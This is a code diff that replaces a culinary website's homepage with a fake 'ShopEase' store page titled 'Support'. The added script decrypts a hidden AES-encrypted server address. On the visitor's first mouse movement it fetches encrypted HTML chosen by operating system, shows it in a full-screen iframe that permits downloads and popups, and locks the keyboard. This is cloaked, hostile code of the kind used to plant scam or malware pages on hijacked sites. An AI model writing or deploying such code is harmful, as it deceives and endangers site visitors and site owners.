@@ -1,9 +1,312 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Home | Culinary Motion Lab</title><meta name="description" content="Independent culinary experiments, animated cooking methods and practical kitchen field notes for curious home cooks."><script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('consent','default',{analytics_storage:'denied',ad_storage:'denied',ad_user_data:'denied',ad_personalization:'denied'});gtag('js',new Date());gtag('config','G-0LY0HY7L01');</script><link rel="stylesheet" href="assets/style.css"></head><body class="home-page"><header class="lab-rail"><a class="lab-mark" href="index.php" aria-label="Culinary Motion Lab home"><b>CML</b><span>Culinary<br>Motion Lab</span></a><div class="rail-index"><span>FOOD</span><span>MOTION</span><span>METHOD</span></div><button class="lab-menu" type="button" aria-expanded="false" aria-controls="lab-nav"><i></i><span>Menu</span></button></header><aside class="lab-nav" id="lab-nav" aria-hidden="true"><div class="nav-readout"><span>Navigation channel</span><b>05</b></div><nav><a href="index.php"><small>01</small>Lab Home</a><a href="lab-manifesto.html"><small>02</small>Manifesto</a><a href="experiment-index.html"><small>03</small>Experiments</a><a href="field-notes.html"><small>04</small>Field Notes</a><a href="contact.html"><small>05</small>Contact</a></nav><p>Independent culinary research, practical home-kitchen method and original editorial guidance.</p></aside><div class="page-signal" aria-hidden="true"><i></i></div><main><section class="lab-launch" id="home-01"><div class="launch-copy"><p class="code">RUN 01 / KINETIC KITCHEN</p><h1>Flavour<br><em>in motion.</em></h1><p class="intro">Culinary Motion Lab turns everyday cooking into a readable system of heat, time, texture and movement—without removing the instinct that makes food personal.</p><a class="lab-button" href="experiment-index.html">Open experiments<span>↗</span></a></div><figure class="launch-image"><img src="assets/images/hero.png" alt="Experimental culinary workbench with ingredients, steam and moving utensils"><figcaption><b>LIVE FEED</b><span>PREP / HEAT / FINISH</span></figcaption></figure><div class="launch-meter" aria-hidden="true"><i></i><b>72°C</b><span>ACTIVE ZONE</span></div></section>
-<section class="motion-readout" id="home-02"><div class="readout-track"><span>CHOP 04 mm</span><span>FOLD 12×</span><span>REST 08 min</span><span>SEAR 210°C</span><span>TASTE 03×</span><span>CHOP 04 mm</span><span>FOLD 12×</span><span>REST 08 min</span></div></section>
-<section class="experiment-matrix" id="home-03"><header><p class="code">RUN 03 / VARIABLE MATRIX</p><h2>Change one thing.<br>Observe everything.</h2><p>Good kitchen experiments stay useful: keep the ingredient, pan and portion stable, then change one variable you can taste.</p></header><div class="matrix-grid"><article><b>A</b><i style="--fill:34%"></i><h3>Heat</h3><p>Control colour, evaporation and the rate at which texture changes.</p></article><article><b>B</b><i style="--fill:62%"></i><h3>Time</h3><p>Measure active cooking separately from resting and carry-over.</p></article><article><b>C</b><i style="--fill:78%"></i><h3>Motion</h3><p>Whisking, folding and agitation change structure as much as heat.</p></article><article><b>D</b><i style="--fill:48%"></i><h3>Seasoning</h3><p>Add in stages, taste between them and record the point of balance.</p></article></div></section>
-<section class="heat-curve" id="home-04"><div class="curve-copy"><p class="code">RUN 04 / HEAT CURVE</p><h2>Temperature is a route, not a destination.</h2><p>Preheat, response, recovery and resting all matter. Move the cursor across the curve to inspect a simple sear cycle.</p><div class="curve-status"><span>PHASE</span><b data-phase>PREHEAT</b><span>TARGET</span><b data-temp>180°C</b></div></div><div class="curve-panel" data-curve><svg viewBox="0 0 900 480" role="img" aria-label="Interactive cooking heat curve"><path class="curve-grid" d="M50 80H850M50 180H850M50 280H850M50 380H850M150 40V430M300 40V430M450 40V430M600 40V430M750 40V430"/><path class="curve-line" d="M50 390C120 380 155 230 225 170S360 105 430 155S500 275 585 250S680 125 760 150S820 260 850 330"/><circle class="curve-dot" cx="50" cy="390" r="14"/><path class="curve-axis" d="M50 40V430H870"/></svg><div class="curve-cursor" aria-hidden="true"></div></div></section>
-<section class="ingredient-relay" id="home-05"><div class="relay-title"><p class="code">RUN 05 / INGREDIENT RELAY</p><h2>Pass flavour forward.</h2></div><div class="relay-lane"><article><span>01</span><h3>Foundation</h3><p>Oil, aromatics and the first contact with heat.</p></article><article><span>02</span><h3>Body</h3><p>The ingredient that defines weight, moisture and structure.</p></article><article><span>03</span><h3>Lift</h3><p>Acid, fresh herbs or bitterness that opens the finish.</p></article><article><span>04</span><h3>Texture</h3><p>A crisp, creamy or chewy contrast added with intention.</p></article><article><span>05</span><h3>Final taste</h3><p>A last check for salt, temperature and serving balance.</p></article></div></section>
-<section class="method-filmstrip" id="home-06"><figure><img src="assets/images/process.png" alt="Top-down culinary process workbench arranged in precise cooking stages"></figure><div class="film-copy"><p class="code">RUN 06 / METHOD FILMSTRIP</p><h2>Read the movement before starting.</h2><p class="intro">A recipe becomes easier when its actions are grouped: prepare the cold work, identify the hot sequence, and protect the short moments that need full attention.</p><ol><li><b>00:00</b><span>Measure and stage</span></li><li><b>00:08</b><span>Build the base</span></li><li><b>00:17</b><span>Control the heat</span></li><li><b>00:24</b><span>Rest and finish</span></li></ol><a class="lab-button inverse" href="lab-manifesto.html">See our method<span>↗</span></a></div></section>
-<section class="sensory-oscillator" id="home-07"><header><p class="code">RUN 07 / SENSORY SIGNAL</p><h2>Cook with more than a timer.</h2></header><div class="oscillator"><div class="wave"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div><ul><li><b>LISTEN</b><span>From wet hiss to dry crackle</span></li><li><b>LOOK</b><span>Colour at edges and surface</span></li><li><b>SMELL</b><span>Raw aroma becoming toasted</span></li><li><b>TOUCH</b><span>Resistance, spring and softness</span></li></ul></div></section>
-<section class="note-rail" id="home-08"><div class="note-heading"><p class="code">RUN 08 / FIELD NOTES</p><h2>Twelve tests for a more responsive kitchen.</h2><a href="field-notes.html">View the complete journal ↗</a></div><div class="note-cards"><a href="note-01.html"><span>01</span><small>HEAT</small><h3>How to Build a Reliable Pan-Heat Baseline</h3><b>08 MIN READ</b></a><a href="note-04.html"><span>04</span><small>TEXTURE</small><h3>Learning the Difference Between Fold, Stir and Whisk</h3><b>09 MIN READ</b></a><a href="note-09.html"><span>09</span><small>BALANCE</small><h3>Using Acid to Correct a Flat-Tasting Dish</h3><b>08 MIN READ</b></a></div></section>
-<section class="final-dispatch" id="home-09"><div class="dispatch-code">CML<br>09</div><div><p class="code">RUN 09 / NEXT DISPATCH</p><h2>Observe. Adjust.<br>Cook again.</h2><p class="intro">Progress in the kitchen is not perfect repetition. It is noticing what changed and knowing which variable to move next.</p><a class="lab-button" href="contact.html">Contact the lab<span>↗</span></a></div></section></main><footer><div><h3>Explore</h3><a href="lab-manifesto.html">Lab Manifesto</a><a href="experiment-index.html">Experiment Index</a><a href="field-notes.html">Field Notes</a></div><div><h3>Contact</h3><p class="one-line">3638 Westbourne Grove, London, UK, W2 5SH, GB</p><a class="one-line" href="tel:+12125559857">+1 2125559857</a><a class="one-line" href="mailto:hello@culinarymotionlab.com">hello@culinarymotionlab.com</a></div><div><h3>Policies</h3><a href="privacy.html">Privacy</a><a href="terms.html">Terms</a><a href="refund.html">Refund</a><a href="shipping.html">Shipping</a></div></footer><aside class="consent"><p>Optional analytics helps us improve our culinary field notes. Advertising storage stays disabled.</p><button type="button" data-consent="accept">Allow analytics</button><button type="button" data-consent="decline">Decline</button></aside><script src="assets/app.js"></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19JzfJcbkpx0lIuONyvMQ9gjcZSw7Bx/Bs36JWstdXSf0v9oWVxZd0x8lBsfAIDzu549PjWPlHakQ==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
